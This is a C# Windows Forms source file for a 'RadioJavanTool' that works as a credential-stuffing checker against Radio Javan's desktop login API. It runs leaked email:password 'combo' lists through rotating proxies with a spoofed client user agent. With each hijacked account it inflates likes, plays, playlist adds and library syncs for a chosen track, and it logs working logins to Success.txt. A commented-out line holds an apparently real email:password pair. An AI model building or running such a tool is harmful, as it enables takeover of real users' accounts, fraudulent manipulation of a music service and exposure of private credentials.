using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ThreadGun;

namespace RadioJavanTool
{
    public partial class Form1 : Form
    {

        List<string> Combo = new List<string>();
        List<string> Proxy = new List<string>();
        int Success;
        int Failure;
        int Retry;
        int Complet;
        int Remain;
        int CPM;
        double Persent;
        int seconds = 0;
        int minutes = 0;
        int hours = 0;
        string ResultTime;
        bool _Save;
        bool _Like;
        bool _Play;
        bool _Sync;

        public enum Type
        {
            MP3,
            Video
        }
        public Type TYAC = Type.MP3;
        public enum Ty
        {
            Http,
            Socks4,
            Socks5,
            Non
        }
        public Ty PRTY = Ty.Non;

        public Form1()
        {
            InitializeComponent();
            this.FormClosed += Form1_FormClosed;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void Thr_Completed(IEnumerable<string> inputs)
        {
            timer1.Enabled = false;
            MessageBox.Show("Action Was Completed.", "Complet");
        }

        private void btnCombo_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Combo |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Combo ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Combo.Clear();
                    Combo.AddRange(File.ReadAllLines(Open.FileName));
                }
                btnCombo.Text = Combo.Count.ToString();
            }
            catch
            {
                btnCombo.Text = Combo.Count.ToString();
                MessageBox.Show("Error To Load Combo.", "Combo");
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //Config("webbartar@gmail.com:59332204");
            try
            {
                if (Combo.Count == 0)
                {
                    MessageBox.Show("Please Load Combo.", "Start");
                }
                else if (_Save == true && textBoxList.Text == "")
                {
                    MessageBox.Show("Please Put ListName.", "Start");
                }
                else if (textBoxTrack.Text == "")
                {
                    MessageBox.Show("Please Put TrackName.", "Start");
                }
                else if(PRTY != Ty.Non && Proxy.Count == 0)
                {
                    MessageBox.Show("Please Load Proxy.", "Start");
                }
                else
                {
                    if (numericUpDown1.Value > Combo.Count)
                    {
                        numericUpDown1.Value = Combo.Count;
                    }
                    if (Retry == 0 && Complet == 0)
                    {
                        ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                        Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                        timer1.Enabled = true;
                        new ThreadGun<string>(Config, Combo, (int)numericUpDown1.Value, Thr_Completed, null).FillingMagazine().Start();
                    }
                }
            }
            catch
            {
                timer1.Enabled = false;
                lblTimer.Text = "00:00:00";
                minutes = 0;
                seconds = 0;
                hours = 0;
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void Config(string line)
        {
            First:
            try
            {
                string Track = textBoxTrack.Text;
                string ListName = "";
                if(_Save == true)
                {
                    ListName = textBoxList.Text;
                }
                string User = line.Split(':')[0];
                string Pass = line.Split(':')[1];
                int p = new Random().Next(Proxy.Count + 1);
                CookieStorage cook = new CookieStorage();
                using(HttpRequest Web = new HttpRequest())
                {
                    switch (PRTY)
                    {
                        case Ty.Http:
                            Web.Proxy = HttpProxyClient.Parse(Proxy[p]);
                            break;
                        case Ty.Socks4:
                            Web.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                            break;
                        case Ty.Socks5:
                            Web.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                            break;
                    }
                    Web.AddHeader(HttpHeader.Accept, "*/*");
                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-GB");
                    Web.AddHeader(HttpHeader.Origin, "file://");
                    Web.UserAgent = "Radio Javan/3.7.8 (Windows_NT 10.0.19043) com.RadioJavan.RJ.desktop";
                    Web.AllowAutoRedirect = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.KeepAlive = true;
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    var Data = Web.Post("https://r-j-app-desk.com/api2/login", Encoding.ASCII.GetBytes("{\"login_email\":\"" + User + "\",\"login_password\":\"" + Pass + "\"}"), "application/json;charset=UTF-8").ToString();
                    if (Data.ToString().Contains("\"success\":true"))
                    {
                        string ID = Regex.Match(Data.ToString(), "\"user_id\":\"(.*?)\"").Groups[1].Value.ToString();
                        switch (TYAC)
                        {
                            case Type.MP3:
                                Web.AllowAutoRedirect = true;
                                Web.IgnoreProtocolErrors = true;
                                Web.KeepAlive = true;
                                Web.UseCookies = true;
                                Web.Cookies = cook;
                                string Re = Web.Get($"https://www.radiojavan.com/mp3s/mp3/{Track}").ToString();
                                string TrackID = Regex.Match(Re, "href=\"radiojavan://mp3/(.*?)/\"").Groups[1].Value.ToString();
                                //===========//
                                Web.AllowAutoRedirect = true;
                                Web.IgnoreProtocolErrors = true;
                                Web.KeepAlive = true;
                                Web.UseCookies = true;
                                Web.Cookies = cook;
                                string Res = Web.Get($"https://r-j-app-desk.com/api2/mp3?url=mp3&id={TrackID}").ToString();
                                //===========================//
                                if (_Sync == true)
                                {
                                    Web.AddHeader(HttpHeader.Accept, "*/*");
                                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-GB");
                                    Web.AddHeader(HttpHeader.Origin, "file://");
                                    Web.UserAgent = "Radio Javan/3.7.8 (Windows_NT 10.0.19043) com.RadioJavan.RJ.desktop";
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Resp = Web.Post("https://r-j-app-desk.com/api2/library_add_items", Encoding.ASCII.GetBytes("{\"items\":[{\"item_id\":" + TrackID + ",\"item_type\":\"mp3\"}]}"), "application/json;charset=UTF-8").ToString();
                                }
                                if (_Like == true)
                                {
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respo = Web.Get($"https://r-j-app-desk.com/api2/mp3_vote?id={TrackID}&type=mp3&vote=5").ToString();
                                }
                                if (_Save == true)
                                {
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respon = Web.Get($"https://r-j-app-desk.com/api2/mp3_playlist_add?type=mp3&mp3={TrackID}&name={ListName}").ToString();
                                }
                                if (_Play == true)
                                {
                                    Web.AddHeader(HttpHeader.Accept, "*/*");
                                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-GB");
                                    Web.AddHeader(HttpHeader.Origin, "file://");
                                    Web.UserAgent = "Radio Javan/3.7.8 (Windows_NT 10.0.19043) com.RadioJavan.RJ.desktop";
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respons = Web.Post("https://r-j-app-desk.com/api2/user_plays", Encoding.ASCII.GetBytes("{\"items\":[{\"item\":" + TrackID + ",\"type\":\"mp3\"}]}"), "application/json;charset=UTF-8").ToString();
                                }
                                break;
                            case Type.Video:
                                Web.AllowAutoRedirect = true;
                                Web.IgnoreProtocolErrors = true;
                                Web.KeepAlive = true;
                                Web.UseCookies = true;
                                Web.Cookies = cook;
                                string Re1 = Web.Get($"https://www.radiojavan.com/videos/video/{Track}").ToString();
                                string TrackID1 = Regex.Match(Re1, "href=\"radiojavan://video/(.*?)/\"").Groups[1].Value.ToString();
                                //=================//
                                Web.AllowAutoRedirect = true;
                                Web.IgnoreProtocolErrors = true;
                                Web.KeepAlive = true;
                                Web.UseCookies = true;
                                Web.Cookies = cook;
                                string Res1 = Web.Get($"https://r-j-app-desk.com/api2/video?url=video&id={TrackID1}").ToString();
                                //===================//
                                if (_Sync == true)
                                {
                                    Web.AddHeader(HttpHeader.Accept, "*/*");
                                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-GB");
                                    Web.AddHeader(HttpHeader.Origin, "file://");
                                    Web.UserAgent = "Radio Javan/3.7.8 (Windows_NT 10.0.19043) com.RadioJavan.RJ.desktop";
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Resp = Web.Post("https://r-j-app-desk.com/api2/library_add_items", Encoding.ASCII.GetBytes("{\"items\":[{\"item_id\":" + TrackID1 + ",\"item_type\":\"video\"}]}"), "application/json;charset=UTF-8").ToString();
                                }
                                if (_Like == true)
                                {
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respo = Web.Get($"https://r-j-app-desk.com/api2/video_vote?id={TrackID1}&type=video&vote=5").ToString();
                                }
                                if (_Save == true)
                                {
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respon = Web.Get($"https://r-j-app-desk.com/api2/video_playlist_add?type=video&video={TrackID1}&name={ListName}").ToString();
                                }
                                if (_Play == true)
                                {
                                    Web.AddHeader(HttpHeader.Accept, "*/*");
                                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-GB");
                                    Web.AddHeader(HttpHeader.Origin, "file://");
                                    Web.UserAgent = "Radio Javan/3.7.8 (Windows_NT 10.0.19043) com.RadioJavan.RJ.desktop";
                                    Web.AllowAutoRedirect = true;
                                    Web.IgnoreProtocolErrors = true;
                                    Web.KeepAlive = true;
                                    Web.UseCookies = true;
                                    Web.Cookies = cook;
                                    string Respons = Web.Post("https://r-j-app-desk.com/api2/user_plays", Encoding.ASCII.GetBytes("{\"items\":[{\"item\":" + TrackID1 + ",\"type\":\"video\"}]}"), "application/json;charset=UTF-8").ToString();
                                }
                                break;
                        }
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Success.txt", true);
                        sw.WriteLine($"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------------Details--------------\nType: {TYAC}\nLike: {_Like}\nSave: {_Save}\nPlay: {_Play}\nSync: {_Sync}\nTrack Name: {Track}\nList Name: {ListName}\nUser ID: {ID}\n-----------------End-----------------\n\n");
                        sw.Close();
                        Success++;
                        Complet++;
                        Remain = Combo.Count - Complet;
                        Persent = (((double)Complet / Combo.Count) * 100);
                        if (minutes == 0)
                        {
                            CPM = Complet;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Complet * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Complet * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblSuccess.Invoke(new MethodInvoker(delegate { lblSuccess.Text = "Success: " + Success.ToString(); }));
                        lblComplet.Invoke(new MethodInvoker(delegate { lblComplet.Text = "Completed: " + Complet.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remain.ToString(); }));
                        lblPersent.Invoke(new MethodInvoker(delegate { lblPersent.Text = "Total: " + Persent.ToString("F3") + "% || CPM: " + CPM.ToString(); }));
                    }
                    else if(Data.ToString().Contains("\"success\":false"))
                    {
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Failure.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                        Failure++;
                        Complet++;
                        Remain = Combo.Count - Complet;
                        lblFail.Invoke(new MethodInvoker(delegate { lblFail.Text = "Failure: " + Failure.ToString(); }));
                        lblComplet.Invoke(new MethodInvoker(delegate { lblComplet.Text = "Completed: " + Complet.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remain.ToString(); }));
                        Persent = (((double)Complet / Combo.Count) * 100);
                        if (minutes == 0)
                        {
                            CPM = Complet;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Complet * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Complet * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblPersent.Invoke(new MethodInvoker(delegate { lblPersent.Text = "Total: " + Persent.ToString("F3") + "% || CPM: " + CPM.ToString(); }));
                    }
                    else
                    {
                        Retry++;
                        lblRetry.Invoke(new MethodInvoker(delegate { lblRetry.Text = "Retry: " + Retry.ToString(); }));
                        Thread.Sleep(1000);
                        goto First;
                    }
                }
            }
            catch
            {
                Retry++;
                lblRetry.Invoke(new MethodInvoker(delegate { lblRetry.Text = "Retry: " + Retry.ToString(); }));
                Thread.Sleep(1000);
                goto First;
            }
        }

        private void checkBoxLike_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxLike.Checked == true)
            {
                _Like = true;
            }
            else
            {
                _Like = false;
            }
        }

        private void checkBoxSave_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxSave.Checked == true)
            {
                _Save = true;
                textBoxList.Enabled = true;
                textBoxList.Clear();
            }
            else
            {
                _Save = false;
                textBoxList.Enabled = false;
                textBoxList.Text = "SaveList Name";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (seconds == 59)
            {
                seconds = 0;
                if (minutes == 59)
                {
                    minutes = 0;
                    hours++;
                }
                else
                {
                    minutes++;
                }
            }
            else
            {
                seconds++;
            }
            lblTimer.Text = (hours > 9 ? hours + "" : "0" + hours) + ":"
                + (minutes > 9 ? minutes + "" : "0" + minutes) + ":"
                + (seconds > 9 ? seconds + "" : "0" + seconds);
        }

        private void checkBoxPlay_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxPlay.Checked == true)
            {
                _Play = true;
            }
            else
            {
                _Play = false;
            }
        }

        private void checkBoxSync_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxSync.Checked == true)
            {
                _Sync = true;
            }
            else
            {
                _Sync = false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBoxProxy.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(comboBox1.SelectedIndex == 0)
            {
                TYAC = Type.MP3;
            }
            else
            {
                TYAC = Type.Video;
            }
        }

        private void textBoxAPI_TextChanged(object sender, EventArgs e)
        {
            try
            {
                HttpRequest http = new HttpRequest();
                var result = http.Get(textBoxAPI.Text).ToString();
                var Final = result.Split('\n');
                Proxy.Clear();
                Proxy.AddRange(Final.Distinct());
                btnProxy.Text = Proxy.Count.ToString();
            }
            catch
            {
                MessageBox.Show("Error To Load Proxy.", "Proxy");
            }
        }

        private void btnProxy_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Proxy |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Proxy ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Proxy.Clear();
                    Proxy.AddRange(File.ReadAllLines(Open.FileName).Distinct());
                    btnProxy.Text = Proxy.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Proxy.", "Proxy");
            }
        }

        private void comboBoxProxy_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxProxy.SelectedIndex == 0)
            {
                PRTY = Ty.Non;
            }
            else if (comboBoxProxy.SelectedIndex == 1)
            {
                PRTY = Ty.Http;
            }
            else if (comboBoxProxy.SelectedIndex == 2)
            {
                PRTY = Ty.Socks4;
            }
            else
            {
                PRTY = Ty.Socks5;
            }
        }
    }
}
